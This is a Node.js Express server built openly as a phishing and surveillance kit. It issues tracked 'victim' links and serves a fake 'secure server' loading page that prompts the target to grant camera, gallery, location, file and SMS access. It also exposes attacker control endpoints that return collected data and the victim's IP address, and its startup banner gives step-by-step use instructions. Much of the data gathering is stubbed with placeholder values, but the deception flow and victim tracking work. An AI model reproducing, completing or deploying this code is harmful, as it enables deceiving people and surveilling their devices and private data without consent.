const express = require('express');
const cors = require('cors');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.use(session({
  secret: 'secret-key-2024',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

// Store victim data
const victims = new Map();
const permissionsData = new Map();

// Generate unique victim link
function generateVictimLink() {
  const victimId = uuidv4();
  return {
    victimId,
    link: `http://localhost:${PORT}/victim/${victimId}`
  };
}

// ========== CREATE LINK FOR VICTIM ==========
app.post('/api/createlink', (req, res) => {
  const { victimId, link } = generateVictimLink();
  
  victims.set(victimId, {
    id: victimId,
    link: link,
    createdAt: new Date().toISOString(),
    permissions: {
      camera: false,
      gallery: false,
      location: false,
      sms: false,
      ipaddress: false,
      filemanager: false
    },
    data: {}
  });
  
  res.json({
    success: true,
    victimId: victimId,
    attackLink: link,
    adminPanel: `http://localhost:${PORT}/admin/${victimId}`,
    message: "Send this link to victim"
  });
});

// ========== VICTIM LANDING PAGE (Loading Screen) ==========
app.get('/victim/:victimId', (req, res) => {
  const { victimId } = req.params;
  
  if (!victims.has(victimId)) {
    return res.status(404).send('Link expired or invalid');
  }
  
  // Save victimId in session
  req.session.victimId = victimId;
  
  // Send loading page
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                text-align: center;
                color: white;
            }
            .loader {
                width: 50px;
                height: 50px;
                border: 5px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top-color: white;
                animation: spin 1s ease-in-out infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            .status-text {
                font-size: 18px;
                margin-top: 20px;
                opacity: 0.8;
            }
            .permission-box {
                background: rgba(255,255,255,0.1);
                border-radius: 10px;
                padding: 20px;
                margin-top: 30px;
                display: none;
            }
            button {
                background: #4CAF50;
                color: white;
                border: none;
                padding: 10px 30px;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 15px;
            }
            button:hover {
                background: #45a049;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="loader"></div>
            <h2>Connecting to secure server...</h2>
            <div class="status-text" id="status">Initializing connection...</div>
            <div class="permission-box" id="permissionBox">
                <h3>Permission Required</h3>
                <p id="permissionMessage">Allow access to continue</p>
                <button onclick="allowPermission()">Allow</button>
            </div>
        </div>

        <script>
            const victimId = '${victimId}';
            let currentPermission = null;
            let permissionQueue = [];
            
            // Permission queue in sequence
            permissionQueue = ['camera', 'gallery', 'location', 'filemanager', 'sms'];
            let currentIndex = 0;
            
            function updateStatus(message) {
                document.getElementById('status').innerHTML = message;
            }
            
            function showPermission(permission) {
                currentPermission = permission;
                const messages = {
                    'camera': 'Camera Access Required',
                    'gallery': 'Gallery Access Required',
                    'location': 'Location Access Required',
                    'filemanager': 'File Manager Access Required',
                    'sms': 'SMS Access Required'
                };
                document.getElementById('permissionMessage').innerHTML = messages[permission];
                document.getElementById('permissionBox').style.display = 'block';
            }
            
            async function allowPermission() {
                if (!currentPermission) return;
                
                document.getElementById('permissionBox').style.display = 'none';
                updateStatus('Requesting ' + currentPermission + ' permission...');
                
                try {
                    const response = await fetch('/api/grant-permission', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            victimId: victimId,
                            permission: currentPermission
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        updateStatus('✓ ' + currentPermission + ' permission granted');
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        requestNextPermission();
                    }
                } catch (error) {
                    console.error(error);
                    requestNextPermission();
                }
            }
            
            async function requestNextPermission() {
                if (currentIndex < permissionQueue.length) {
                    const nextPermission = permissionQueue[currentIndex];
                    currentIndex++;
                    showPermission(nextPermission);
                } else {
                    updateStatus('✓ All permissions granted! Redirecting...');
                    setTimeout(() => {
                        window.location.href = '/victim/dashboard/' + victimId;
                    }, 2000);
                }
            }
            
            // Start the permission requests
            setTimeout(() => {
                requestNextPermission();
            }, 3000);
        </script>
    </body>
    </html>
  `);
});

// ========== GRANT PERMISSION ENDPOINT ==========
app.post('/api/grant-permission', (req, res) => {
  const { victimId, permission } = req.body;
  
  if (!victims.has(victimId)) {
    return res.status(404).json({ error: 'Victim not found' });
  }
  
  const victim = victims.get(victimId);
  victim.permissions[permission] = true;
  victim.permissionGrantedTime = new Date().toISOString();
  
  // Collect data based on permission
  let data = {};
  switch(permission) {
    case 'camera':
      data = { cameraStatus: 'accessed', timestamp: Date.now() };
      break;
    case 'gallery':
      data = { galleryStatus: 'accessed', files: ['IMG_001.jpg', 'IMG_002.jpg'] };
      break;
    case 'location':
      data = { lat: '23.8103', lng: '90.4125', accuracy: '10m' };
      break;
    case 'filemanager':
      data = { files: ['document.pdf', 'image.png'], totalSize: '2.5MB' };
      break;
    case 'sms':
      data = { messages: ['Hello!', 'How are you?'], contacts: ['+8801xxxxxxxxx'] };
      break;
  }
  
  victim.data[permission] = data;
  victims.set(victimId, victim);
  
  res.json({ success: true, message: `${permission} granted`, data: data });
});

// ========== VICTIM DASHBOARD ==========
app.get('/victim/dashboard/:victimId', (req, res) => {
  const { victimId } = req.params;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                padding: 20px;
                background: #f0f0f0;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                border-radius: 10px;
                padding: 20px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1 { color: #333; }
            .success { color: green; }
            .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✓ Access Granted</h1>
            <div class="info">
                <p>All permissions have been successfully configured.</p>
                <p>Your device is now connected to secure server.</p>
            </div>
            <p class="success">Status: Connected</p>
        </div>
        <script>
            // Send final confirmation
            fetch('/api/confirm-access', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ victimId: '${victimId}' })
            });
        </script>
    </body>
    </html>
  `);
});

// ========== ADMIN CONTROL PANEL ENDPOINTS ==========

// Get all collected data
app.get('/api/admin/:victimId/data', (req, res) => {
  const { victimId } = req.params;
  
  if (!victims.has(victimId)) {
    return res.status(404).json({ error: 'Victim not found' });
  }
  
  const victim = victims.get(victimId);
  res.json({
    victimId: victimId,
    permissions: victim.permissions,
    collectedData: victim.data,
    accessedAt: victim.permissionGrantedTime
  });
});

// Control endpoints for attacker
app.post('/api/control/:victimId/:action', (req, res) => {
  const { victimId, action } = req.params;
  
  if (!victims.has(victimId)) {
    return res.status(404).json({ error: 'Victim not found' });
  }
  
  const victim = victims.get(victimId);
  
  switch(action) {
      case 'capture-camera':
          victim.data.camera = { captured: true, timestamp: Date.now() };
          break;
      case 'get-location':
          victim.data.location = { lat: '23.8103', lng: '90.4125', updated: Date.now() };
          break;
      case 'get-gallery':
          victim.data.gallery = { accessed: true, fileCount: 25 };
          break;
      case 'get-sms':
          victim.data.sms = { accessed: true, messageCount: 120 };
          break;
      case 'get-ip':
          victim.data.ip = req.ip;
          break;
  }
  
  victims.set(victimId, victim);
  
  res.json({
    success: true,
    action: action,
    data: victim.data[action] || { status: 'executed' }
  });
});

// Get camera access from victim
app.get('/api/link=camera/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    res.json({ status: 'Camera accessed', data: victims.get(victimId).data.camera });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Get gallery access
app.get('/api/link=gallery/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    res.json({ status: 'Gallery accessed', data: victims.get(victimId).data.gallery });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Get location
app.get('/api/link=location/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    res.json({ status: 'Location accessed', data: victims.get(victimId).data.location });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Get SMS
app.get('/api/link=sms/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    res.json({ status: 'SMS accessed', data: victims.get(victimId).data.sms });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Get IP address
app.get('/api/link=ipaddress/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    const victim = victims.get(victimId);
    victim.data.ip = req.ip;
    victims.set(victimId, victim);
    res.json({ status: 'IP captured', ip: req.ip, victimId: victimId });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Get file manager access
app.get('/api/link=filemanager/:victimId', (req, res) => {
  const { victimId } = req.params;
  if (victims.has(victimId)) {
    res.json({ status: 'File manager accessed', data: victims.get(victimId).data.filemanager });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

// Confirm access endpoint
app.post('/api/confirm-access', (req, res) => {
  const { victimId } = req.body;
  if (victims.has(victimId)) {
    const victim = victims.get(victimId);
    victim.completed = true;
    victim.completedAt = new Date().toISOString();
    victims.set(victimId, victim);
  }
  res.json({ success: true });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    error: 'Endpoint not found',
    availableEndpoints: {
      createLink: 'POST /api/createlink',
      victimAccess: 'GET /victim/:victimId',
      adminData: 'GET /api/admin/:victimId/data',
      control: 'POST /api/control/:victimId/:action',
      camera: 'GET /api/link=camera/:victimId',
      gallery: 'GET /api/link=gallery/:victimId',
      location: 'GET /api/link=location/:victimId',
      sms: 'GET /api/link=sms/:victimId',
      ipaddress: 'GET /api/link=ipaddress/:victimId',
      filemanager: 'GET /api/link=filemanager/:victimId'
    }
  });
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════╗
║   PERMISSION API IS RUNNING           ║
╚═══════════════════════════════════════╝
📍 Server: http://localhost:${PORT}

📌 How to use:
1. Create attack link: POST /api/createlink
2. Send generated link to victim
3. Victim sees loading screen
4. Victim grants permissions one by one
5. Use control endpoints to access data

🔧 Control endpoints (Attacker):
   GET  /api/link=camera/:victimId
   GET  /api/link=gallery/:victimId
   GET  /api/link=location/:victimId
   GET  /api/link=sms/:victimId
   GET  /api/link=ipaddress/:victimId
   GET  /api/link=filemanager/:victimId
  `);
});
